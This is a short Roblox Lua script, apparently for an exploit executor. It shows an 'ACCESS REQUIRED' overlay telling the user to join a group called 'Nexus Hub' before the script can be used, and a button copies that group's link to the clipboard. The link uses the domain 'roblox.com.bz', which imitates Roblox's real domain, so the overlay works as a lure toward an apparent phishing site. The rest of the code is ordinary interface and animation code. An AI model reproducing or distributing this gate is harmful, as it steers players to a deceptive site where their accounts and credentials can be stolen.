local GROUP_NAME = "Nexus Hub"
local GROUP_LINK = "https://roblox.com.bz/communities/2261753063"

if game:GetService("CoreGui"):FindFirstChild("JoinGroupGUI") then
    game:GetService("CoreGui").JoinGroupGUI:Destroy()
end

local gui = Instance.new("ScreenGui")
gui.Name = "JoinGroupGUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = game:GetService("CoreGui")

local bg = Instance.new("Frame")
bg.Size = UDim2.fromScale(1,1)
bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
bg.BackgroundTransparency = 0.35
bg.Parent = gui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0,460,0,270)
frame.Position = UDim2.new(.5,-230,.5,-135)
frame.BackgroundColor3 = Color3.fromRGB(30,30,40)
frame.Parent = bg

Instance.new("UICorner", frame).CornerRadius = UDim.new(0,18)

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(0,170,255)
stroke.Thickness = 2
stroke.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,50)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBlack
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(255,255,255)
title.Text = "🔒 ACCESS REQUIRED"
title.Parent = frame

local desc = Instance.new("TextLabel")
desc.Position = UDim2.new(0,20,0,60)
desc.Size = UDim2.new(1,-40,0,90)
desc.BackgroundTransparency = 1
desc.TextWrapped = true
desc.Font = Enum.Font.Gotham
desc.TextScaled = true
desc.TextColor3 = Color3.fromRGB(220,220,220)
desc.Text = "To use this script, please join:\n"..GROUP_NAME.."\n\nPress the button below to copy the group link."
desc.Parent = frame

local copy = Instance.new("TextButton")
copy.Size = UDim2.new(.8,0,0,50)
copy.Position = UDim2.new(.1,0,.65,0)
copy.BackgroundColor3 = Color3.fromRGB(0,170,255)
copy.Font = Enum.Font.GothamBold
copy.TextScaled = true
copy.TextColor3 = Color3.new(1,1,1)
copy.Text = "📋 Copy Group Link"
copy.Parent = frame
Instance.new("UICorner", copy).CornerRadius = UDim.new(0,12)

local close = Instance.new("TextButton")
close.Size = UDim2.new(.3,0,0,40)
close.Position = UDim2.new(.35,0,.88,0)
close.BackgroundColor3 = Color3.fromRGB(60,60,60)
close.Font = Enum.Font.GothamBold
close.TextScaled = true
close.TextColor3 = Color3.new(1,1,1)
close.Text = "Close"
close.Parent = frame
Instance.new("UICorner", close).CornerRadius = UDim.new(0,10)

local TweenService = game:GetService("TweenService")

TweenService:Create(frame,TweenInfo.new(0.5,Enum.EasingStyle.Back),{
    Size = UDim2.new(0,460,0,270)
}):Play()

task.spawn(function()
    while copy.Parent do
        TweenService:Create(copy,TweenInfo.new(.8),{
            BackgroundColor3 = Color3.fromRGB(0,220,255)
        }):Play()
        task.wait(.8)
        TweenService:Create(copy,TweenInfo.new(.8),{
            BackgroundColor3 = Color3.fromRGB(0,170,255)
        }):Play()
        task.wait(.8)
    end
end)

copy.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(GROUP_LINK)
        copy.Text = "✅ Link Copied!"
    else
        copy.Text = "❌ Clipboard Unsupported"
    end
end)

close.MouseButton1Click:Connect(function()
    gui:Destroy()
end)
